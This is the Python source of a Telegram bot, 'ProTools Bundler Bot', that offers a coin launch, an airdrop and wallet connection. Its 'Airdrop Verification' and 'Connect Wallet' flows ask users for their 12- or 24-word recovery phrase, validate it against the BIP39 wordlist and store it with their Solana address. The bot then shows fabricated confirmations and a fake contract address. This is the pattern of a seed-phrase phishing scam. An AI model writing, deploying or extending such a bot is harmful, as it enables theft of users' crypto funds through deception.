import logging
import re
import hashlib
from datetime import datetime
from threading import Thread

from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

from config import BOT_TOKEN
from wordlist import BIP39_WORDLIST

# ─────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────
# FLASK KEEP-ALIVE (for Render + UptimeRobot)
# ─────────────────────────────────────────────
flask_app = Flask(__name__)

@flask_app.route("/")
def health():
    return "OK", 200

def run_flask():
    flask_app.run(host="0.0.0.0", port=8080)

def keep_alive():
    t = Thread(target=run_flask, daemon=True)
    t.start()

# ─────────────────────────────────────────────
# IN-MEMORY USER LOGS  { user_id: [entries] }
# ─────────────────────────────────────────────
user_logs: dict[int, list] = {}

def log_action(user_id: int, action: str, detail: str = ""):
    entry = {
        "time": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "action": action,
        "detail": detail,
    }
    user_logs.setdefault(user_id, []).insert(0, entry)
    user_logs[user_id] = user_logs[user_id][:100]  # keep last 100

# ─────────────────────────────────────────────
# VALIDATION
# ─────────────────────────────────────────────
def validate_phrase(text: str):
    words = text.strip().lower().split()
    if len(words) not in (12, 24):
        return False, (
            f"❌ *Wrong word count.*\n"
            f"You sent *{len(words)} word(s)* — phrase must be exactly *12 or 24 words*.\n\n"
            f"Please try again:"
        )
    bad = [f"Word {i+1}: `{w}`" for i, w in enumerate(words) if w not in BIP39_WORDLIST]
    if bad:
        return False, (
            f"❌ *Invalid word(s) detected:*\n\n"
            + "\n".join(bad)
            + "\n\nDouble-check those words and try again:"
        )
    return True, None

def validate_solana_address(text: str):
    addr = text.strip()
    if not re.fullmatch(r"[1-9A-HJ-NP-Za-km-z]{32,44}", addr):
        return False, (
            f"❌ *Invalid Solana address.*\n\n"
            f"`{addr}`\n\n"
            f"A valid Solana address is 32–44 base58 characters "
            f"(no `0`, `O`, `I`, or `l`).\n\nPlease try again:"
        )
    return True, None

# ─────────────────────────────────────────────
# KEYBOARDS
# ─────────────────────────────────────────────
def main_menu():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚀 Launch Coin",   callback_data="launch_coin"),
            InlineKeyboardButton("📊 Transactions",  callback_data="transactions"),
        ],
        [
            InlineKeyboardButton("🎁 Airdrop",       callback_data="airdrop"),
            InlineKeyboardButton("🔑 Wallet",        callback_data="wallet"),
        ],
        [
            InlineKeyboardButton("📜 View Logs",     callback_data="view_logs"),
            InlineKeyboardButton("❓ Help",           callback_data="help"),
        ],
        [
            InlineKeyboardButton("💬 Feedback",      callback_data="feedback"),
        ],
    ])

def cancel_btn():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ])

# ─────────────────────────────────────────────
# /start
# ─────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    log_action(uid, "start_command", f"Chat ID: {uid}")
    context.user_data.clear()
    await update.effective_message.reply_text(
        "🚀 *Welcome to ProTools Bundler Bot*\n\nChoose an option below:",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )

# ─────────────────────────────────────────────
# CALLBACK QUERY HANDLER
# ─────────────────────────────────────────────
async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid  = query.from_user.id
    data = query.data
    log_action(uid, "button_press", f"Button: {data}")

    # ── CANCEL ──────────────────────────────
    if data == "cancel":
        context.user_data.clear()
        await query.edit_message_text(
            "🚀 *Welcome to ProTools Bundler Bot*\n\nChoose an option below:",
            parse_mode="Markdown",
            reply_markup=main_menu(),
        )

    # ── HELP ────────────────────────────────
    elif data == "help":
        await query.edit_message_text(
            "❓ *Help — Button Guide*\n\n"
            "🚀 *Launch Coin* — Create and simulate a token launch on Solana.\n\n"
            "📊 *Transactions* — View your recent wallet transactions.\n\n"
            "🎁 *Airdrop* — Submit your wallet to join the airdrop queue.\n\n"
            "🔑 *Wallet* — Connect your wallet using your recovery phrase.\n\n"
            "📜 *View Logs* — See every action you've taken in this bot.\n\n"
            "💬 *Feedback* — Contact the team by email.\n\n"
            "❌ *Cancel* — Return to the main menu at any time.",
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

    # ── VIEW LOGS ───────────────────────────
    elif data == "view_logs":
        logs = user_logs.get(uid, [])
        if not logs:
            text = "📜 *Your Bot Logs (latest first):*\n\nNo activity recorded yet."
        else:
            lines = ["📋 *Your Bot Logs (latest first):*\n"]
            for e in logs:
                lines.append(f"*{e['time']}*\n`{e['action']}` {e['detail']}")
            text = "\n\n".join(lines)
        # Telegram messages max 4096 chars — trim if needed
        if len(text) > 4000:
            text = text[:4000] + "\n\n_...older logs trimmed_"
        await query.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

    # ── AIRDROP ─────────────────────────────
    elif data == "airdrop":
        context.user_data["state"] = "AWAITING_PHRASE"
        context.user_data["flow"]  = "airdrop"
        await query.edit_message_text(
            "🎁 *Airdrop Verification*\n\n"
            "To confirm eligibility, please send your *12 or 24-word recovery phrase*:",
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

    # ── WALLET ──────────────────────────────
    elif data == "wallet":
        context.user_data["state"] = "AWAITING_PHRASE"
        context.user_data["flow"]  = "wallet"
        await query.edit_message_text(
            "🔑 *Connect Wallet*\n\n"
            "Please send your *12 or 24-word recovery phrase* to connect your wallet:",
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

    # ── TRANSACTIONS ────────────────────────
    elif data == "transactions":
        await query.edit_message_text(
            "📊 *Recent Transactions*\n\n"
            "No transactions found yet.\n"
            "Connect your wallet first to start tracking.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Connect Wallet", callback_data="wallet")],
                [InlineKeyboardButton("❌ Cancel",         callback_data="cancel")],
            ]),
        )

    # ── LAUNCH COIN ─────────────────────────
    elif data == "launch_coin":
        context.user_data["state"] = "COIN_NAME"
        await query.edit_message_text(
            "🚀 *Launch Your Coin — Step 1 of 3*\n\n"
            "Enter your *Coin Name*:\n_Example: ProTools Token_",
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

    # ── FEEDBACK ────────────────────────────
    elif data == "feedback":
        await query.edit_message_text(
            "💬 *Feedback*\n\n"
            "We'd love to hear from you!\n\n"
            "📧 Email us at:\n"
            "*ProToolsBundlerBot@gmail.com*\n\n"
            "We'll get back to you as soon as possible. Thank you! 🙏",
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

# ─────────────────────────────────────────────
# MESSAGE HANDLER  (multi-step flows)
# ─────────────────────────────────────────────
async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    text  = update.message.text.strip()
    state = context.user_data.get("state")
    flow  = context.user_data.get("flow", "")

    # ── NO STATE — show menu ─────────────────
    if not state:
        await update.message.reply_text(
            "Use the menu to get started:",
            reply_markup=main_menu(),
        )
        return

    # ── PHRASE ──────────────────────────────
    if state == "AWAITING_PHRASE":
        valid, err = validate_phrase(text)
        if not valid:
            log_action(uid, "phrase_rejected", f"flow:{flow}")
            await update.message.reply_text(err, parse_mode="Markdown", reply_markup=cancel_btn())
            return
        context.user_data["phrase"] = text
        context.user_data["state"]  = "AWAITING_ADDRESS"
        log_action(uid, "phrase_accepted", f"flow:{flow}")
        await update.message.reply_text(
            "✅ *Phrase verified!*\n\n"
            "Now send your *Solana wallet address*:",
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

    # ── ADDRESS ─────────────────────────────
    elif state == "AWAITING_ADDRESS":
        valid, err = validate_solana_address(text)
        if not valid:
            log_action(uid, "address_rejected", f"flow:{flow}")
            await update.message.reply_text(err, parse_mode="Markdown", reply_markup=cancel_btn())
            return
        context.user_data["address"] = text
        context.user_data["state"]   = None
        log_action(uid, "wallet_connected", f"flow:{flow} addr:{text[:8]}...")

        if flow == "airdrop":
            msg = (
                "✅ *Eligibility confirmed!*\n\n"
                "Your wallet has been queued for the next airdrop cycle.\n"
                "You'll be notified when tokens are distributed. 🎁"
            )
        else:
            msg = (
                "✅ *Wallet connected successfully!*\n\n"
                "You can now use all ProTools features. 🔑"
            )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=main_menu())

    # ── COIN NAME ───────────────────────────
    elif state == "COIN_NAME":
        context.user_data["coin_name"] = text
        context.user_data["state"]     = "COIN_TICKER"
        log_action(uid, "coin_name_set", text)
        await update.message.reply_text(
            f"✅ Name: *{text}*\n\n"
            "🚀 *Step 2 of 3* — Enter your *Coin Ticker*:\n_Example: PTB_",
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

    # ── COIN TICKER ─────────────────────────
    elif state == "COIN_TICKER":
        ticker = text.upper()
        context.user_data["coin_ticker"] = ticker
        context.user_data["state"]       = "COIN_SUPPLY"
        log_action(uid, "coin_ticker_set", ticker)
        await update.message.reply_text(
            f"✅ Ticker: *${ticker}*\n\n"
            "🚀 *Step 3 of 3* — Enter the *Total Supply*:\n_Example: 1000000000_",
            parse_mode="Markdown",
            reply_markup=cancel_btn(),
        )

    # ── COIN SUPPLY ─────────────────────────
    elif state == "COIN_SUPPLY":
        if not text.replace(",", "").isdigit():
            await update.message.reply_text(
                "❌ Supply must be a number. Please try again:",
                parse_mode="Markdown",
                reply_markup=cancel_btn(),
            )
            return
        name   = context.user_data.get("coin_name", "Unknown")
        ticker = context.user_data.get("coin_ticker", "TKN")
        supply = text.replace(",", "")
        fake_addr = hashlib.sha256(f"{name}{ticker}{uid}".encode()).hexdigest()[:44]
        context.user_data["state"] = None
        log_action(uid, "coin_launched", f"{name} ${ticker} supply:{supply}")
        await update.message.reply_text(
            f"🎉 *Coin Launched Successfully!*\n\n"
            f"📛 Name:     *{name}*\n"
            f"💠 Ticker:   *${ticker}*\n"
            f"📦 Supply:   *{int(supply):,}*\n"
            f"🔗 Contract: `{fake_addr}`\n\n"
            f"_Simulated launch on Solana devnet._",
            parse_mode="Markdown",
            reply_markup=main_menu(),
        )

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
def main():
    keep_alive()
    logger.info("Starting ProTools Bundler Bot...")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .build()
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    logger.info("Bot is polling...")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
    )

if __name__ == "__main__":
    main()
